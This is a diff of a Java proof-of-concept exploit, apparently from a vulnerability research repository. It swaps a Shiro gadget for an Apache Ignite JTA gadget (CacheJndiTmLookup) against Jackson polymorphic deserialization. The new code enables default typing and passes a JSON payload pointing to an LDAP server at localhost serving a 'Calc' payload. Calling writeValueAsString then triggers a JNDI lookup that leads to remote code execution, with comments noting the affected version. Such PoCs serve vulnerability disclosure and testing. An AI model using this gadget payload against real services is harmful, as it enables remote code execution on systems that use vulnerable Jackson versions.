@@ -5,19 +5,28 @@ import com.threedr3am.bug.common.server.LdapServer;
 import java.io.IOException;
 
 /**
- * 比较鸡肋，需要调用writeValueAsString才能触发，因为Collection<Realm> getRealms()的返回值虽然是Collection，
- * 但是貌似是因为有泛型子类型导致值解析使用AsArrayTypeDeserialize，然后getter的invoke之前判断不为空就抛异常了
  *
- * shiro-core gadget
+ * 比较鸡肋，需要调用writeValueAsString才能触发
+ *
+ * ignite jta gadget
+ *
+ * Mitre id:
+ * Reporters:
+ *
+ * Fix will be included in:
+ *
+ * 2.9.10.4
+ * Does not affect 2.10.0 and later
  *
  * <dependency>
- *        <groupId>org.apache.shiro</groupId>
- *        <artifactId>shiro-core</artifactId>
+ *       <groupId>org.apache.ignite</groupId>
+ *       <artifactId>ignite-jta</artifactId>
+ *       <version>2.8.0</version>
  * </dependency>
  *
  * @author threedr3am
  */
-public class ShiroPoc {
+public class IgniteJtaPoc {
 
   static {
     //rmi server示例
@@ -31,10 +40,9 @@ public class ShiroPoc {
     ObjectMapper mapper = new ObjectMapper();
     mapper.enableDefaultTyping();
 
-    String json = "[\"org.apache.shiro.realm.jndi.JndiRealmFactory\", {\"jndiNames\": \"ldap://localhost:43658/Calc\"}]";
+    String json = "[\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", {\"jndiNames\": [\"java.util.ArrayList\", [\"ldap://localhost:43658/Calc\"]]}]";
     Object o = mapper.readValue(json, Object.class);
     mapper.writeValueAsString(o);
   }
-
 
 }
